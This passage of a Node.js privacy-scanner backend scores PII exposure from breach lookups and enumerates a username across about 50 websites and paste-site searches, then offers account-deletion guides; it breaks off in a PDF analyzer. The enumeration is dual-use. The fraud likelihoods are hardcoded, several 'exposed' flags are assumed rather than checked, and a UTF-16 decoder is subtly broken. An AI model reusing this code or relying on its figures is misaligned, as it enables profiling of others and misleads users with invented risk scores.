app.post("/scan-pii", async (req, res) => {
  try {
    const { email, phone, fullName, dateOfBirth, ssnLast4, address, username } = req.body;

    if (!email && !phone && !fullName && !dateOfBirth && !ssnLast4 && !address && !username) {
      return res.status(400).json({ error: "Provide at least one field to analyze." });
    }

    const fields = {};
    let breachData = null;

    // Email - real LeakCheck query
    if (email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      try {
        const { data: emailJson } = await leakcheckGet(
          `https://leakcheck.io/api/public?check=${encodeURIComponent(email)}`
        );
        breachData = emailJson;
        const breachCount = emailJson.found || 0;
        const exposedTypes = emailJson.fields || [];
        const hasCreds = exposedTypes.some(f => ["password","password_hash","hash"].includes(f.toLowerCase()));
        const hasPII   = exposedTypes.some(f => ["phone","address","dob","name","ssn","cc"].includes(f.toLowerCase()));
        fields.email = {
          label: "Email Address",
          provided: email,
          exposed: breachCount > 0,
          severity: breachCount === 0 ? "safe" : hasCreds || hasPII ? "critical" : "high",
          detail: breachCount > 0
            ? `Found in ${breachCount} breach${breachCount > 1 ? "es" : ""}` + (exposedTypes.length ? ` - ${exposedTypes.slice(0,3).map(f => FIELD_LABELS[f.toLowerCase()] || f).join(", ")} exposed` : "")
            : "Not found in known breach databases",
          riskPoints: breachCount === 0 ? 5 : Math.min(15 + breachCount * 3, 30),
          sources: (emailJson.sources || []).slice(0, 4).map(s => s.name),
          exposedTypes,
        };
      } catch {
        fields.email = {
          label: "Email Address", provided: email, exposed: null,
          severity: "unknown", detail: "Breach check unavailable", riskPoints: 10,
          sources: [], exposedTypes: [],
        };
      }
    }

    // Phone
    if (phone) {
      const cleaned = phone.replace(/\D/g, "");
      const valid = cleaned.length >= 10 && cleaned.length <= 15;
      fields.phone = {
        label: "Phone Number",
        provided: phone,
        exposed: valid,
        severity: valid ? "high" : "safe",
        detail: valid
          ? "Phone numbers appear in virtually all major data broker databases and are sold commercially"
          : "Could not validate phone format",
        riskPoints: valid ? 20 : 0,
        sources: valid ? ["WhitePages", "Spokeo", "BeenVerified", "Intelius"] : [],
        exposedTypes: valid ? ["phone"] : [],
      };
    }

    // Full Name
    if (fullName && fullName.trim().length > 1) {
      const parts = fullName.trim().split(/\s+/);
      const hasFullName = parts.length >= 2;
      fields.fullName = {
        label: "Full Name",
        provided: fullName,
        exposed: true,
        severity: hasFullName ? "medium" : "low",
        detail: hasFullName
          ? "Full legal names are indexed in public records, court documents, voter registrations, and countless data broker profiles"
          : "Partial names are lower risk but still searchable",
        riskPoints: hasFullName ? 12 : 5,
        sources: ["Public Records", "People Search Engines", "Court Records"],
        exposedTypes: ["name"],
      };
    }

    // Date of Birth
    if (dateOfBirth) {
      const dob = new Date(dateOfBirth);
      const valid = !isNaN(dob.getTime());
      const age = valid ? Math.floor((Date.now() - dob.getTime()) / (1000 * 60 * 60 * 24 * 365)) : 0;
      fields.dateOfBirth = {
        label: "Date of Birth",
        provided: valid ? dob.toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric" }) : dateOfBirth,
        exposed: valid,
        severity: "critical",
        detail: "DOB is the single most-requested KBA (Knowledge-Based Authentication) factor by banks, credit bureaus, and government agencies. It cannot be changed.",
        riskPoints: valid ? 30 : 0,
        sources: ["Credit Bureaus", "Government Records", "Data Brokers"],
        exposedTypes: ["dob"],
        age: age || null,
      };
    }

    // SSN Last 4
    if (ssnLast4) {
      const valid = /^\d{4}$/.test(ssnLast4.trim());
      fields.ssnLast4 = {
        label: "SSN (Last 4 Digits)",
        provided: "XXXX",  // never echo SSN back
        exposed: valid,
        severity: "critical",
        detail: valid
          ? "Even the last 4 SSN digits are a high-value authenticator. Combined with DOB and name, they allow attackers to reconstruct the full SSN or pass account security questions."
          : "Invalid format - SSN fragment must be 4 digits",
        riskPoints: valid ? 35 : 0,
        sources: valid ? ["Data Brokers", "Dark Web Markets", "Healthcare Records"] : [],
        exposedTypes: valid ? ["ssn"] : [],
      };
    }

    // Address
    if (address && address.trim().length > 3) {
      fields.address = {
        label: "Physical Address",
        provided: address,
        exposed: true,
        severity: "high",
        detail: "Residential addresses appear in property tax records, voter registrations, package delivery histories, and are freely available from many data brokers.",
        riskPoints: 18,
        sources: ["County Property Records", "Voter Rolls", "USPS Data", "Data Brokers"],
        exposedTypes: ["address"],
      };
    }

    // Username
    if (username && username.trim().length > 0) {
      fields.username = {
        label: "Username / Handle",
        provided: username,
        exposed: true,
        severity: "low",
        detail: "Usernames are used in credential stuffing attacks and link your identity across multiple platforms, revealing browsing habits and interests.",
        riskPoints: 6,
        sources: ["Breach Databases", "Username Search Engines", "Social Platforms"],
        exposedTypes: ["username"],
      };
    }

    // ── Combination Risk Analysis ────────────────────────────────────────────
    const has = (f) => fields[f]?.exposed === true;

    const combinationRisks = [];
    let fraudBonus = 0;

    if (has("dateOfBirth") && has("ssnLast4")) {
      combinationRisks.push({
        fields: ["Date of Birth", "SSN Fragment"],
        risk: "critical",
        threat: "Synthetic Identity Creation",
        description: "DOB + SSN fragment is the exact profile criminals use to seed synthetic identities. The remaining SSN digits can be purchased on dark web markets for as little as $5.",
        likelihood: 92,
      });
      fraudBonus += 45;
    }

    if (has("fullName") && has("dateOfBirth") && (has("ssnLast4") || has("address"))) {
      combinationRisks.push({
        fields: ["Full Name", "Date of Birth", has("ssnLast4") ? "SSN Fragment" : "Address"],
        risk: "critical",
        threat: "New Account Fraud",
        description: "This combination meets the minimum requirements to open new lines of credit, apply for personal loans, and file fraudulent tax returns in your name.",
        likelihood: 88,
      });
      fraudBonus += 35;
    }

    if (has("email") && has("phone")) {
      const emailExposed = fields.email?.exposed === true;
      combinationRisks.push({
        fields: ["Email Address", "Phone Number"],
        risk: emailExposed ? "high" : "medium",
        threat: "SIM Swap & Account Takeover",
        description: "Email + phone is the standard profile for SIM swap attacks - criminals call your carrier claiming to be you to redirect your number and intercept 2FA codes.",
        likelihood: emailExposed ? 74 : 55,
      });
      fraudBonus += emailExposed ? 20 : 10;
    }

    if (has("fullName") && has("dateOfBirth")) {
      combinationRisks.push({
        fields: ["Full Name", "Date of Birth"],
        risk: "high",
        threat: "Credit Pre-Screen Fraud",
        description: "Name + DOB is sufficient for many instant credit offers and is used to bypass 'soft' identity checks at retailers and online lenders.",
        likelihood: 65,
      });
      fraudBonus += 20;
    }

    if (has("fullName") && has("address") && has("phone")) {
      combinationRisks.push({
        fields: ["Full Name", "Address", "Phone"],
        risk: "high",
        threat: "Social Engineering & Mail Fraud",
        description: "A complete contact profile enables highly targeted vishing calls, fraudulent benefit claims, and USPS mail intercept requests.",
        likelihood: 60,
      });
      fraudBonus += 15;
    }

    if (has("email") && (fields.email?.exposedTypes || []).includes("password")) {
      combinationRisks.push({
        fields: ["Email", "Password Hash (from breach)"],
        risk: "critical",
        threat: "Credential Stuffing Attack",
        description: "Exposed email + password combinations are used to test access across hundreds of websites within minutes using automated tools.",
        likelihood: 85,
      });
      fraudBonus += 25;
    }

    // ── Scoring ──────────────────────────────────────────────────────────────
    const allRiskPoints = Object.values(fields).map(f => f.riskPoints || 0);
    const piiScore = Math.min(allRiskPoints.reduce((a, b) => a + b, 0), 95);

    const exposedCount = Object.values(fields).filter(f => f.exposed).length;
    const syntheticFraudRisk = Math.min(10 + fraudBonus + (exposedCount > 3 ? 15 : exposedCount > 1 ? 8 : 0), 97);

    // Data broker estimate
    const brokerCount = Math.round(10 + exposedCount * 14 + (has("phone") ? 20 : 0) + (has("address") ? 15 : 0));

    res.json({
      success: true,
      fields,
      piiScore,
      syntheticFraudRisk,
      combinationRisks,
      brokerCount: Math.min(brokerCount, 185),
      exposedFieldCount: exposedCount,
      totalFields: Object.keys(fields).length,
      breachData: breachData ? { found: breachData.found, fields: breachData.fields } : null,
    });
  } catch (err) {
    console.error("PII scan error:", err.message);
    res.status(500).json({ error: "Scan failed. Please try again." });
  }
});

// ── Ghost Account Finder ───────────────────────────────────────────────────────

const GHOST_PLATFORMS = [
  // ── Developer ────────────────────────────────────────────────────────────────
  { id:"github",       name:"GitHub",        url:"https://github.com/{u}",                           check:"404",         cat:"Developer",    pStatus:"active",  riskW:6,  deleteUrl:"https://github.com/settings/admin",                                          deleteDiff:"Easy"   },
  { id:"gitlab",       name:"GitLab",        url:"https://gitlab.com/{u}",                           check:"404",         cat:"Developer",    pStatus:"active",  riskW:5,  deleteUrl:"https://gitlab.com/-/profile/account",                                       deleteDiff:"Easy"   },
  { id:"bitbucket",    name:"Bitbucket",     url:"https://bitbucket.org/{u}",                        check:"404",         cat:"Developer",    pStatus:"active",  riskW:5,  deleteUrl:"https://bitbucket.org/account/settings/",                                    deleteDiff:"Easy"   },
  { id:"devto",        name:"Dev.to",        url:"https://dev.to/{u}",                               check:"404",         cat:"Developer",    pStatus:"active",  riskW:4,  deleteUrl:"https://dev.to/settings/account",                                            deleteDiff:"Easy"   },
  { id:"hackernews",   name:"Hacker News",   url:"https://news.ycombinator.com/user?id={u}",         check:"content_not", cat:"Developer",    pStatus:"active",  riskW:9,  deleteUrl:"mailto:hn@ycombinator.com",                                                  deleteDiff:"Hard",  notFound:"No such user." },
  { id:"replit",       name:"Replit",        url:"https://replit.com/@{u}",                          check:"404",         cat:"Developer",    pStatus:"active",  riskW:4,  deleteUrl:"https://replit.com/account",                                                 deleteDiff:"Easy"   },
  { id:"codepen",      name:"CodePen",       url:"https://codepen.io/{u}",                           check:"404",         cat:"Developer",    pStatus:"active",  riskW:4,  deleteUrl:"https://codepen.io/accounts/close",                                          deleteDiff:"Easy"   },
  { id:"npm",          name:"npm",           url:"https://www.npmjs.com/~{u}",                       check:"404",         cat:"Developer",    pStatus:"active",  riskW:5,  deleteUrl:"https://www.npmjs.com/support",                                              deleteDiff:"Medium" },
  { id:"codewars",     name:"Codewars",      url:"https://www.codewars.com/users/{u}",               check:"404",         cat:"Developer",    pStatus:"active",  riskW:3,  deleteUrl:"https://www.codewars.com/users/edit",                                        deleteDiff:"Easy"   },
  { id:"producthunt",  name:"Product Hunt",  url:"https://www.producthunt.com/@{u}",                 check:"404",         cat:"Developer",    pStatus:"active",  riskW:3,  deleteUrl:"https://www.producthunt.com/settings",                                       deleteDiff:"Easy"   },
  { id:"hashnode",     name:"Hashnode",      url:"https://hashnode.com/@{u}",                        check:"404",         cat:"Developer",    pStatus:"active",  riskW:3,  deleteUrl:"https://hashnode.com/settings",                                              deleteDiff:"Easy"   },
  { id:"leetcode",     name:"LeetCode",      url:"https://leetcode.com/{u}",                         check:"404",         cat:"Developer",    pStatus:"active",  riskW:4,  deleteUrl:"https://support.leetcode.com/hc/en-us/requests/new",                         deleteDiff:"Medium" },
  { id:"kaggle",       name:"Kaggle",        url:"https://www.kaggle.com/{u}",                       check:"404",         cat:"Developer",    pStatus:"active",  riskW:4,  deleteUrl:"https://www.kaggle.com/account",                                             deleteDiff:"Easy"   },
  { id:"hackerearth",  name:"HackerEarth",   url:"https://www.hackerearth.com/@{u}",                 check:"404",         cat:"Developer",    pStatus:"active",  riskW:3,  deleteUrl:"https://www.hackerearth.com/settings/",                                      deleteDiff:"Medium" },

  // ── Social / Forum ───────────────────────────────────────────────────────────
  { id:"reddit",       name:"Reddit",        url:"https://www.reddit.com/user/{u}",                  check:"404",         cat:"Forum",        pStatus:"active",  riskW:13, deleteUrl:"https://www.reddit.com/settings/account",                                    deleteDiff:"Easy"   },
  { id:"quora",        name:"Quora",         url:"https://www.quora.com/profile/{u}",                check:"404",         cat:"Forum",        pStatus:"active",  riskW:8,  deleteUrl:"https://www.quora.com/contact",                                              deleteDiff:"Hard"   },
  { id:"disqus",       name:"Disqus",        url:"https://disqus.com/by/{u}/",                       check:"404",         cat:"Forum",        pStatus:"active",  riskW:7,  deleteUrl:"https://help.disqus.com/en/articles/1717236-account-deletion",               deleteDiff:"Medium" },
  { id:"askfm",        name:"Ask.fm",        url:"https://ask.fm/{u}",                               check:"404",         cat:"Social",       pStatus:"active",  riskW:9,  deleteUrl:"https://ask.fm/account/delete",                                              deleteDiff:"Easy"   },
  { id:"pinterest",    name:"Pinterest",     url:"https://www.pinterest.com/{u}/",                   check:"404",         cat:"Social",       pStatus:"active",  riskW:5,  deleteUrl:"https://www.pinterest.com/settings/privacy/",                                deleteDiff:"Easy"   },
  { id:"medium",       name:"Medium",        url:"https://medium.com/@{u}",                          check:"404",         cat:"Writing",      pStatus:"active",  riskW:6,  deleteUrl:"https://medium.com/me/settings",                                             deleteDiff:"Easy"   },

  // ── Identity ─────────────────────────────────────────────────────────────────
  { id:"keybase",      name:"Keybase",       url:"https://keybase.io/{u}",                           check:"404",         cat:"Identity",     pStatus:"active",  riskW:14, deleteUrl:"https://keybase.io/account/delete",                                          deleteDiff:"Medium" },
  { id:"gravatar",     name:"Gravatar",      url:"https://en.gravatar.com/{u}",                      check:"404",         cat:"Identity",     pStatus:"active",  riskW:12, deleteUrl:"https://gravatar.com/account/remove",                                        deleteDiff:"Easy"   },
  { id:"about_me",     name:"About.me",      url:"https://about.me/{u}",                             check:"404",         cat:"Identity",     pStatus:"active",  riskW:9,  deleteUrl:"https://about.me/settings/account",                                          deleteDiff:"Easy"   },

  // ── Creative / Media ─────────────────────────────────────────────────────────
  { id:"flickr",       name:"Flickr",        url:"https://www.flickr.com/people/{u}",                check:"404",         cat:"Photos",       pStatus:"active",  riskW:8,  deleteUrl:"https://www.flickr.com/account/delete/",                                     deleteDiff:"Medium" },
  { id:"deviantart",   name:"DeviantArt",    url:"https://www.deviantart.com/{u}",                   check:"404",         cat:"Art",          pStatus:"active",  riskW:7,  deleteUrl:"https://www.deviantart.com/settings/account",                                deleteDiff:"Easy"   },
  { id:"behance",      name:"Behance",       url:"https://www.behance.net/{u}",                      check:"404",         cat:"Art",          pStatus:"active",  riskW:6,  deleteUrl:"https://www.behance.net/misc/delete_account",                                deleteDiff:"Medium" },
  { id:"dribbble",     name:"Dribbble",      url:"https://dribbble.com/{u}",                         check:"404",         cat:"Art",          pStatus:"active",  riskW:5,  deleteUrl:"https://dribbble.com/account/edit",                                          deleteDiff:"Easy"   },
  { id:"vimeo",        name:"Vimeo",         url:"https://vimeo.com/{u}",                            check:"404",         cat:"Video",        pStatus:"active",  riskW:6,  deleteUrl:"https://vimeo.com/settings/account/delete",                                  deleteDiff:"Easy"   },
  { id:"soundcloud",   name:"SoundCloud",    url:"https://soundcloud.com/{u}",                       check:"404",         cat:"Music",        pStatus:"active",  riskW:6,  deleteUrl:"https://soundcloud.com/settings/account/delete-account",                     deleteDiff:"Easy"   },
  { id:"lastfm",       name:"Last.fm",       url:"https://www.last.fm/user/{u}",                     check:"404",         cat:"Music",        pStatus:"active",  riskW:7,  deleteUrl:"https://www.last.fm/settings/account/delete",                                deleteDiff:"Easy"   },
  { id:"500px",        name:"500px",         url:"https://500px.com/p/{u}",                          check:"404",         cat:"Photos",       pStatus:"active",  riskW:5,  deleteUrl:"https://500px.com/settings/account",                                         deleteDiff:"Easy"   },
  { id:"mixcloud",     name:"Mixcloud",      url:"https://www.mixcloud.com/{u}/",                    check:"404",         cat:"Music",        pStatus:"active",  riskW:4,  deleteUrl:"https://www.mixcloud.com/help/",                                             deleteDiff:"Medium" },

  // ── Gaming ───────────────────────────────────────────────────────────────────
  { id:"steam",        name:"Steam",         url:"https://steamcommunity.com/id/{u}",                check:"content_not", cat:"Gaming",       pStatus:"active",  riskW:8,  deleteUrl:"https://help.steampowered.com/en/faqs/view/69E3-14AF-9764-4C28",            deleteDiff:"Hard",  notFound:"The specified profile could not be found." },
  { id:"itch",         name:"itch.io",       url:"https://itch.io/profile/{u}",                      check:"404",         cat:"Gaming",       pStatus:"active",  riskW:4,  deleteUrl:"https://itch.io/user/settings",                                              deleteDiff:"Easy"   },
  { id:"chess",        name:"Chess.com",     url:"https://www.chess.com/member/{u}",                 check:"404",         cat:"Gaming",       pStatus:"active",  riskW:3,  deleteUrl:"https://support.chess.com/article/190-how-can-i-delete-my-account",         deleteDiff:"Medium" },
  { id:"kongregate",   name:"Kongregate",    url:"https://www.kongregate.com/accounts/{u}",          check:"404",         cat:"Gaming",       pStatus:"legacy",  riskW:6,  deleteUrl:"https://support.kongregate.com/",                                            deleteDiff:"Hard"   },

  // ── Finance / Data ───────────────────────────────────────────────────────────
  { id:"venmo",        name:"Venmo",         url:"https://account.venmo.com/u/{u}",                  check:"404",         cat:"Finance",      pStatus:"active",  riskW:17, deleteUrl:"https://help.venmo.com/hc/en-us/articles/209690068",                         deleteDiff:"Medium" },
  { id:"cashapp",      name:"Cash App",      url:"https://cash.app/${u}",                            check:"404",         cat:"Finance",      pStatus:"active",  riskW:17, deleteUrl:"https://cash.app/help/6485-close-cash-app-account",                         deleteDiff:"Medium" },
  { id:"pastebin",     name:"Pastebin",      url:"https://pastebin.com/u/{u}",                       check:"404",         cat:"Data",         pStatus:"active",  riskW:22, deleteUrl:"https://pastebin.com/account/delete",                                        deleteDiff:"Easy"   },

  // ── Professional ─────────────────────────────────────────────────────────────
  { id:"linkedin",     name:"LinkedIn",      url:"https://www.linkedin.com/in/{u}",                  check:"404",         cat:"Professional", pStatus:"active",  riskW:9,  deleteUrl:"https://www.linkedin.com/mypreferences/d/close-your-account",               deleteDiff:"Medium" },
  { id:"wellfound",    name:"Wellfound",     url:"https://wellfound.com/u/{u}",                      check:"404",         cat:"Professional", pStatus:"active",  riskW:6,  deleteUrl:"https://wellfound.com/account/edit",                                         deleteDiff:"Easy"   },

  // ── Lifestyle ────────────────────────────────────────────────────────────────
  { id:"letterboxd",   name:"Letterboxd",    url:"https://letterboxd.com/{u}/",                      check:"404",         cat:"Entertainment",pStatus:"active",  riskW:4,  deleteUrl:"https://letterboxd.com/settings/",                                           deleteDiff:"Easy"   },
  { id:"goodreads",    name:"Goodreads",     url:"https://www.goodreads.com/{u}",                    check:"404",         cat:"Entertainment",pStatus:"active",  riskW:5,  deleteUrl:"https://support.goodreads.com/s/article/How-do-I-delete-my-account",        deleteDiff:"Hard"   },
  { id:"strava",       name:"Strava",        url:"https://www.strava.com/athletes/{u}",              check:"404",         cat:"Fitness",      pStatus:"active",  riskW:7,  deleteUrl:"https://www.strava.com/account/delete",                                      deleteDiff:"Easy"   },
  { id:"duolingo",     name:"Duolingo",      url:"https://www.duolingo.com/profile/{u}",             check:"404",         cat:"Education",    pStatus:"active",  riskW:3,  deleteUrl:"https://support.duolingo.com/hc/en-us/articles/360007996912",               deleteDiff:"Easy"   },
  { id:"instructables",name:"Instructables", url:"https://www.instructables.com/member/{u}/",        check:"404",         cat:"DIY",          pStatus:"active",  riskW:4,  deleteUrl:"https://www.instructables.com/account/close",                                deleteDiff:"Medium" },

  // ── Legacy / Defunct ─────────────────────────────────────────────────────────
  { id:"myspace",      name:"MySpace",       url:"https://myspace.com/{u}",                          check:"404",         cat:"Legacy",       pStatus:"legacy",  riskW:16, deleteUrl:"https://myspace.com/closeaccount",                                           deleteDiff:"Hard"   },
  { id:"livejournal",  name:"LiveJournal",   url:"https://www.livejournal.com/~{u}",                 check:"404",         cat:"Legacy",       pStatus:"legacy",  riskW:13, deleteUrl:"https://www.livejournal.com/accountstatus.bml",                              deleteDiff:"Medium" },
  { id:"xanga",        name:"Xanga",         url:"http://www.xanga.com/{u}",                         check:"404",         cat:"Legacy",       pStatus:"defunct", riskW:10, deleteUrl:null,                                                                         deleteDiff:"N/A"    },
  { id:"formspring",   name:"Formspring",    url:"http://www.formspring.me/{u}",                     check:"404",         cat:"Legacy",       pStatus:"defunct", riskW:9,  deleteUrl:null,                                                                         deleteDiff:"N/A"    },
  { id:"vine",         name:"Vine (archive)",url:"https://vine.co/{u}",                              check:"404",         cat:"Legacy",       pStatus:"defunct", riskW:8,  deleteUrl:null,                                                                         deleteDiff:"N/A"    },
];

async function checkGhostPlatform(username, platform) {
  const rawUrl = platform.url.replace("{u}", encodeURIComponent(username));
  try {
    const resp = await axios.get(rawUrl, {
      headers: {
        "User-Agent": BROWSER_UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
      },
      timeout: 9000,
      validateStatus: () => true,
      maxRedirects: 4,
    });

    let found = false;
    if (platform.check === "404") {
      if (resp.status === 429 || resp.status === 403) {
        return { ...platform, url: rawUrl, accountStatus: "unknown" };
      }
      found = resp.status === 200;
    } else if (platform.check === "content_not") {
      const body = (resp.data || "").toString();
      found = resp.status === 200 && !body.includes(platform.notFound);
    }

    return { ...platform, url: rawUrl, accountStatus: found ? "found" : "not_found" };
  } catch {
    return { ...platform, url: rawUrl, accountStatus: "unknown" };
  }
}

app.post("/scan-ghost", async (req, res) => {
  try {
    const { username, email } = req.body;
    if (!username && !email) {
      return res.status(400).json({ error: "Username or email address is required." });
    }

    const scanUsername = username?.trim() || email.split("@")[0].trim();

    // ── Run all checks in parallel ─────────────────────────────────────────
    const [platformResults, serpData, emailData] = await Promise.all([

      Promise.all(GHOST_PLATFORMS.map(p => checkGhostPlatform(scanUsername, p))),

      (async () => {
        if (!SERPAPI_KEY) return { organic: [], pasteResults: [] };
        try {
          const searches = [];
          searches.push(axios.get("https://serpapi.com/search.json", {
            params: { engine: "google", q: `"${scanUsername}"`, num: 10, api_key: SERPAPI_KEY },
            timeout: 15000,
          }));
          searches.push(axios.get("https://serpapi.com/search.json", {
            params: { engine: "google", q: `site:pastebin.com OR site:ghostbin.com "${scanUsername}"`, num: 5, api_key: SERPAPI_KEY },
            timeout: 12000,
          }));
          if (email) {
            searches.push(axios.get("https://serpapi.com/search.json", {
              params: { engine: "google", q: `"${email}"`, num: 8, api_key: SERPAPI_KEY },
              timeout: 12000,
            }));
          }

          const settled = await Promise.allSettled(searches);
          const organic = [], pasteResults = [];

          for (const r of settled) {
            if (r.status !== "fulfilled") continue;
            for (const item of (r.value.data.organic_results || [])) {
              const url = item.link || "";
              const domain = (() => { try { return new URL(url).hostname.replace("www.", ""); } catch { return ""; } })();
              if (domain.includes("pastebin") || domain.includes("ghostbin") || domain.includes("hastebin")) {
                pasteResults.push({ title: item.title, url, snippet: item.snippet || "", domain });
              } else {
                organic.push({ title: item.title, url, snippet: item.snippet || "", domain });
              }
            }
          }
          return { organic, pasteResults };
        } catch { return { organic: [], pasteResults: [] }; }
      })(),

      (async () => {
        if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return null;
        try {
          const { data } = await leakcheckGet(`https://leakcheck.io/api/public?check=${encodeURIComponent(email)}`);
          return data;
        } catch { return null; }
      })(),
    ]);

    // ── Classify results ───────────────────────────────────────────────────
    const found    = platformResults.filter(p => p.accountStatus === "found");
    const notFound = platformResults.filter(p => p.accountStatus === "not_found");
    const unknown  = platformResults.filter(p => p.accountStatus === "unknown");

    const activeFound  = found.filter(p => p.pStatus === "active");
    const legacyFound  = found.filter(p => p.pStatus === "legacy" || p.pStatus === "defunct");

    // ── Forgotten Exposure Score ───────────────────────────────────────────
    let forgottenScore = 5;

    for (const p of activeFound)  forgottenScore += p.riskW * 0.9;
    for (const p of legacyFound)  forgottenScore += p.riskW * 1.6; // legacy = more forgotten
    if ((serpData.pasteResults || []).length > 0)   forgottenScore += 22;
    if ((serpData.organic || []).length > 5)         forgottenScore += 10;
    if (emailData?.found > 0) {
      forgottenScore += emailData.found * 8;
      const hasCreds = (emailData.fields || []).some(f => ["password","password_hash","hash"].includes(f));
      if (hasCreds) forgottenScore += 12;
    }
    if (found.length >= 10) forgottenScore += 15;
    else if (found.length >= 6) forgottenScore += 8;

    forgottenScore = Math.min(Math.round(forgottenScore), 97);

    // ── Deletion Guide ─────────────────────────────────────────────────────
    const deletionGuide = found
      .filter(p => p.deleteUrl)
      .sort((a, b) => b.riskW - a.riskW)
      .map(p => ({
        id: p.id,
        name: p.name,
        category: p.cat,
        platformStatus: p.pStatus,
        deleteUrl: p.deleteUrl,
        deleteDiff: p.deleteDiff,
        riskWeight: p.riskW,
        profileUrl: p.url,
        steps: getDeletionSteps(p.id),
      }));

    // ── Category breakdown ─────────────────────────────────────────────────
    const cats = {};
    for (const p of found) {
      cats[p.cat] = (cats[p.cat] || 0) + 1;
    }
    const categoryBreakdown = Object.entries(cats)
      .sort((a, b) => b[1] - a[1])
      .map(([cat, count]) => ({ cat, count }));

    res.json({
      success: true,
      scanUsername,
      email: email || null,
      found,
      activeFound,
      legacyFound,
      notFound: notFound.map(p => ({ id: p.id, name: p.name, cat: p.cat, pStatus: p.pStatus })),
      unknownCount: unknown.length,
      totalChecked: platformResults.length,
      forgottenScore,
      webMentions: (serpData.organic || []).slice(0, 8),
      pasteResults: (serpData.pasteResults || []).slice(0, 6),
      emailBreach: emailData ? { found: emailData.found || 0, fields: emailData.fields || [], sources: (emailData.sources || []).slice(0, 4).map(s => s.name) } : null,
      deletionGuide,
      categoryBreakdown,
      serpAPIUsed: !!SERPAPI_KEY,
    });
  } catch (err) {
    console.error("Ghost scan error:", err.message);
    res.status(500).json({ error: "Scan failed. Please try again." });
  }
});

function getDeletionSteps(id) {
  const steps = {
    github:       ["Go to Settings → Account", "Scroll to bottom - click 'Delete this account'", "Type your username to confirm"],
    gitlab:       ["Profile → Edit Profile → Account", "Click 'Delete account'", "Enter password to confirm"],
    reddit:       ["Settings → Account → Deactivate Account", "Enter username and password", "Note: posts remain visible"],
    keybase:      ["Settings → Account → Delete Account", "Follow the revocation steps to remove your keys first"],
    gravatar:     ["Log in with WordPress.com account", "Account → Close Account", "This also deletes linked WordPress.com data"],
    venmo:        ["Open Venmo app → Settings → Close Venmo Account", "Or contact support at venmo.com/contact-us"],
    cashapp:      ["App → Profile icon → Support → Something Else → Account Settings → Close Cash App Account"],
    pastebin:     ["Log in → Account Settings → Delete Account", "All your pastes will be removed"],
    myspace:      ["Log in → Account Settings → Close Account", "Profile data may remain indexed for months"],
    flickr:       ["Account Settings → Privacy → Delete Account", "Download your photos first via Flickr Camera Roll"],
    soundcloud:   ["Settings → Account → Delete Account", "All uploads will be permanently removed"],
    lastfm:       ["Settings → Account → Delete account", "Your listening history will be erased"],
    steam:        ["Steam has no self-service deletion - contact Steam Support", "Request is manual and reviewed case-by-case"],
    hackernews:   ["Email hn@ycombinator.com requesting account deletion", "No self-service option exists"],
    livejournal:  ["Account Settings → Delete Journal", "Journals remain accessible for 30 days then are purged"],
    medium:       ["Settings → Security → Delete Account", "Exported your stories first under Settings → Download"],
    linkedin:     ["Me → Settings → Account Preferences → Close Account"],
    deviantart:   ["Account Settings → Deactivate Account", "Username is released and art remains visible briefly"],
    about_me:     ["Settings → Account → Delete Account"],
    strava:       ["Settings → My Account → Delete Your Strava Account", "Your activities are permanently deleted"],
  };
  return steps[id] || ["Log in to your account", "Navigate to Settings → Account or Privacy", "Find and click 'Delete' or 'Close Account'"];
}

// ── Document Analyzer ─────────────────────────────────────────────────────────

const docUpload = multer({
  storage,
  limits: { fileSize: 25 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    const allowed = [
      "application/pdf",
      "application/msword",
      "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
      "application/vnd.ms-excel",
      "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
      "application/vnd.ms-powerpoint",
      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
      "image/jpeg", "image/png", "image/webp", "image/gif", "image/tiff",
      "application/octet-stream",
    ];
    if (allowed.includes(file.mimetype)) cb(null, true);
    else cb(new Error("Unsupported file type for document analysis"));
  },
});

function detectMagicType(buf) {
  if (buf.length < 4) return "unknown";
  if (buf[0] === 0x25 && buf[1] === 0x50 && buf[2] === 0x44 && buf[3] === 0x46) return "pdf";
  if (buf[0] === 0x50 && buf[1] === 0x4B && buf[2] === 0x03 && buf[3] === 0x04) return "zip";
  if (buf[0] === 0xD0 && buf[1] === 0xCF && buf[2] === 0x11 && buf[3] === 0xE0) return "ole2";
  if (buf[0] === 0xFF && buf[1] === 0xD8 && buf[2] === 0xFF) return "jpeg";
  if (buf[0] === 0x89 && buf[1] === 0x50 && buf[2] === 0x4E && buf[3] === 0x47) return "png";
  if (buf[0] === 0x47 && buf[1] === 0x49 && buf[2] === 0x46) return "gif";
  if ((buf[0] === 0x49 && buf[1] === 0x49) || (buf[0] === 0x4D && buf[1] === 0x4D)) return "tiff";
  return "unknown";
}

function parsePdfDate(raw) {
  if (!raw) return null;
  const m = raw.match(/D:(\d{4})(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/);
  if (!m) return null;
  return `${m[1]}-${m[2]}-${m[3]}T${m[4]}:${m[5]}:${m[6]}Z`;
}

function decodePdfString(s) {
  if (!s) return null;
  // BOM UTF-16 BE
  if (s.startsWith("\xFE\xFF")) {
    try {
      const buf = Buffer.from(s, "binary");
      return buf.slice(2).toString("utf16le").split("").reverse().join("").split("").reverse().join("");
    } catch { /* fall through */ }
  }
  return s.replace(/\\(\d{3})/g, (_, o) => String.fromCharCode(parseInt(o, 8)))
           .replace(/\\n/g, " ").replace(/\\r/g, " ").trim();
}

function extractPdfMeta(buf) {
  const str = buf.toString("binary");
  const grab = (re) => { const m = str.match(re); return m ? decodePdfString(m[1]) : null; };
  const meta = {
    title:    grab(/\/Title\s*\(([^)]*)\)/),
    author:   grab(/\/Author\s*\(([^)]*)\)/),
    creator:  grab(/\/Creator\s*\(([^)]*)\)/),
    producer: grab(/\/Producer\s*\(([^)]*)\)/),
    subject:  grab(/\/Subject\s*\(([^)]*)\)/),
    keywords: grab(/\/Keywords\s*\(([^)]*)\)/),
    created:  parsePdfDate(grab(/\/CreationDate\s*\(([^)]*)\)/)),
    modified: parsePdfDate(grab(/\/ModDate\s*\(([^)]*)\)/)),
  };
  const pageHits = (str.match(/\/Type\s*\/Page\b/g) || []).length;
  meta.pageCount = pageHits > 0 ? pageHits : null;
  return meta;
}

function analyzePdfThreats(buf) {
